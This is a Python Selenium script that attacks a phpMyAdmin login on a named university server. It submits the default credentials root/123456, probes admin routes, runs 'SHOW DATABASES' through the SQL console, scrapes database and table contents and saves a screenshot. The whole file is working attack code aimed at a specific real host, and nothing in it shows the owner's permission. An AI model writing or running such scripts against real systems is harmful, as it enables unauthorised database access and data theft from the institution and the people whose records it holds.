#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time, re

opts = Options()
opts.add_argument('--headless')
opts.add_argument('--no-sandbox')
opts.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(options=opts)

try:
    # Access phpMyAdmin
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases')
    time.sleep(5)
    
    # Fill login form with root/123456
    user = driver.find_element(By.NAME, 'pma_username')
    user.clear()
    user.send_keys('root')
    
    pass_field = driver.find_element(By.NAME, 'pma_password')
    pass_field.clear()
    pass_field.send_keys('123456')
    pass_field.send_keys(Keys.RETURN)
    time.sleep(5)
    
    # Check the result
    tc = driver.page_source
    tc_clean = re.sub(r'<[^>]+>', ' ', tc)
    tc_clean = re.sub(r'\s+', ' ', tc_clean).strip()
    
    print(f"Length: {len(tc_clean)}")
    print(f"Content: {tc_clean[:1000]}")
    print()
    
    # Check for database content
    print(f"Has 'mysql': {'mysql' in tc_clean.lower()}")
    print(f"Has 'Database': {'Database' in tc_clean}")
    print(f"Has 'Welcome': {'Welcome' in tc_clean or 'Bienvenido' in tc_clean}")
    print(f"Has 'Access denied': {'Access denied' in tc_clean}")
    print(f"Has 'AllowNoPassword': {'AllowNoPassword' in tc_clean}")
    
    # Look for database names
    if len(tc_clean) > 2000:
        print("\n[!] POSSIBLE ACCESS!")
        db_names = re.findall(r'(?:mysql|information_schema|phpmyadmin|uns|registro|sistemas)[^<,"]*', tc_clean, re.IGNORECASE)
        print(f"  Database names: {db_names}")
        
        # Look for table data
        td_elements = driver.find_elements(By.TAG_NAME, 'td')
        td_text = [t.text.strip() for t in td_elements if t.text.strip()]
        if td_text:
            print(f"  Table data: {td_text[:20]}")
        
        # Look for any visible content
        body_text = driver.find_element(By.TAG_NAME, 'body').text
        print(f"\n  Body text: {body_text[:500]}")
    
    # Try to access different database routes
    print("\n=== RUTAS CON CREDENCIALES ===\n")
    
    db_routes = [
        'index.php?route=/server/databases/data&db=mysql',
        'index.php?route=/server/databases/data',
        'index.php?route=/server/sql',
        'index.php?route=/server/variables',
        'index.php?route=/server/status',
    ]
    
    for route in db_routes:
        driver.get(f'https://orcl.uns.edu.pe/{route}')
        time.sleep(3)
        
        tc_route = driver.page_source
        tc_route_clean = re.sub(r'<[^>]+>', ' ', tc_route)
        tc_route_clean = re.sub(r'\s+', ' ', tc_route_clean).strip()
        print(f"{route.split('=')[-1]}: len={len(tc_route_clean)}")
        
        if len(tc_route_clean) > 2000:
            print(f"  [!] Accessible!")
            if 'mysql' in tc_route_clean.lower():
                print(f"  [!] MySQL data visible!")
            break
    
    # Try to execute SQL
    print("\n=== EJECUTAR SQL ===\n")
    try:
        # Find the SQL textarea
        sql_textarea = driver.find_element(By.TAG_NAME, 'textarea')
        sql_textarea.clear()
        sql_textarea.send_keys('SHOW DATABASES')
        time.sleep(2)
        
        # Find the Go button
        go_buttons = driver.find_elements(By.XPATH, '//input[@type="submit" or @value="Go"]')
        for btn in go_buttons:
            btn.click()
            time.sleep(5)
            break
        
        tc_sql = driver.page_source
        tc_sql_clean = re.sub(r'<[^>]+>', ' ', tc_sql)
        tc_sql_clean = re.sub(r'\s+', ' ', tc_sql_clean).strip()
        print(f"SQL result: {tc_sql_clean[:500]}")
        
        if 'mysql' in tc_sql_clean.lower():
            print("\n[!] Database names visible!")
            db_names_sql = re.findall(r'(?:mysql|information_schema|phpmyadmin)[^<,"]*', tc_sql_clean, re.IGNORECASE)
            print(f"  Databases: {db_names_sql}")
        
    except Exception as e:
        print(f"SQL error: {e}")
    
    # Try to access the phpMyAdmin main page
    print("\n=== PAGINA PRINCIPAL ===\n")
    driver.get('https://orcl.uns.edu.pe/index.php')
    time.sleep(5)
    tc_main = driver.page_source
    tc_main_clean = re.sub(r'<[^>]+>', ' ', tc_main)
    tc_main_clean = re.sub(r'\s+', ' ', tc_main_clean).strip()
    print(f"Main page: len={len(tc_main_clean)}")
    if len(tc_main_clean) > 2000:
        print("[!] Main page accessible!")
    
    # Save screenshot
    driver.save_screenshot('C:\\Users\\Leguion T\\Desktop\\plan te pent\\prueba\\phpmysql_root_123456.png')
    print("\nScreenshot saved!")
    
finally:
    driver.quit()

print("\n=== FIN ===")
